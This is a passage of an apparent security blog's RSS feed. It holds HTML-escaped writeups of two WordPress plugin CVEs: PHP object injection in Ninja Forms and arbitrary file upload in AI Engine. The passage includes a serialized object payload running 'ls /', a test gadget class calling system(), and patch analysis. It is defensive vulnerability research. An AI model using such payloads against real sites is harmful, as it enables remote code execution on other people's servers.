class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;O:15:\&amp;#34;ObjectInjection\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:4:\&amp;#34;ls&amp;ensp;/\&amp;#34;;}&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Resend the request.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;To test locally, create a class with a &lt;code&gt;__wakeup()&lt;/code&gt; magic method that triggers upon deserialization, and place it in &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;ObjectInjection&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&#x9;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;p&gt;The CVE-2025-9083 vulnerability stems from using &lt;code&gt;maybe_unserialize()&lt;/code&gt; on user-controlled input without any class restriction or validation. This enables unauthenticated attackers to execute arbitrary code if a suitable gadget exists within WordPress or other plugins/themes. The 3.11.1 patch completely prevents object creation by switching to &lt;code&gt;unserialize()&lt;/code&gt; with &lt;code&gt;[&#39;allowed_classes&#39;&amp;ensp;=&amp;gt;&amp;ensp;false]&lt;/code&gt;, effectively mitigating the root cause of the PHP Object Injection.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt; is extremely dangerous when applied to user input.&lt;/li&gt;&#xA;&lt;li&gt;A single gadget anywhere in the codebase can lead to Remote Code Execution.&lt;/li&gt;&#xA;&lt;li&gt;WordPress AJAX endpoints exposed to unauthenticated users are high-value targets.&lt;/li&gt;&#xA;&lt;li&gt;JSON embedding requires careful escaping of serialized payloads to avoid breaking structure.&lt;/li&gt;&#xA;&lt;li&gt;The 3.11.1 patch demonstrates that controlling allowed classes during unserialization is a critical defensive measure.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-forms/vulnerability/wordpress-ninja-forms-plugin-3-11-1-unauthenticated-php-object-injection-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Forms Plugin &amp;lt; 3.11.1 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-7847 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-13-cve-2025-7847/</link>
      <pubDate>Thu, 13 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-13-cve-2025-7847/</guid>
      <category domain="http://localhost:1313/categories/cve-analyst/">CVE Analyst</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;AI Engine&lt;/strong&gt; plugin for &lt;strong&gt;WordPress&lt;/strong&gt; contains an &lt;strong&gt;arbitrary file upload&lt;/strong&gt; vulnerability due to missing &lt;strong&gt;file type validation&lt;/strong&gt; in the &lt;code&gt;rest_simpleFileUpload()&lt;/code&gt; function in versions &lt;strong&gt;2.9.3&lt;/strong&gt; and &lt;strong&gt;2.9.4&lt;/strong&gt;.&#xA;This allows &lt;strong&gt;authenticated attackers&lt;/strong&gt; (attackers with authentication), with &lt;strong&gt;Subscriber-level&lt;/strong&gt; privileges or higher, to &lt;strong&gt;upload arbitrary files&lt;/strong&gt; to the affected website&amp;rsquo;s &lt;strong&gt;server&lt;/strong&gt; when the &lt;strong&gt;REST API&lt;/strong&gt; is enabled, which can lead to &lt;strong&gt;remote code execution (RCE)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-7847&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-7847&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: 2.9.3-2.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.9.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ai-engine/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;AI Engine&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability occurs because the upload handling function writes files directly (&lt;code&gt;copy()&lt;/code&gt;, &lt;code&gt;file_put_contents()&lt;/code&gt;) without &lt;strong&gt;checking file type or authenticating the user&lt;/strong&gt;, allowing an attacker to &lt;strong&gt;upload arbitrary files (including &lt;code&gt;.php&lt;/code&gt;)&lt;/strong&gt; into the uploads directory and execute malicious code.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/diff.png&#34; title=&#34;Validate file type&#34; data-thumbnail=&#34;/posts/2025-11-13-cve-2025-7847/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Validate File Type&lt;/h2&gt;&lt;p&gt;Validate file type&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-13-cve-2025-7847/diff.png&#39; alt=&#34;Validate File Type&#34; height=&#34;516&#34; width=&#34;1819&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Validate file type&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Validate&amp;ensp;filename&amp;ensp;extension&amp;ensp;for&amp;ensp;base64&amp;ensp;uploads&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$validate&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_check_filetype&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$validate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;File&amp;ensp;type&amp;ensp;is&amp;ensp;not&amp;ensp;allowed.&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch added file type checks in the &lt;code&gt;simpleFileUpload&lt;/code&gt; and &lt;code&gt;upload_file&lt;/code&gt; functions using &lt;code&gt;wp_check_filetype()&lt;/code&gt; to only allow uploads for valid formats based on WordPress&amp;rsquo;s whitelist.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers several public APIs via the &lt;code&gt;rest_api_init()&lt;/code&gt; function&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;rest_api_init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$public_api&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;public_api&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$public_api&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;bearer_token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;public_api_bearer_token&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span 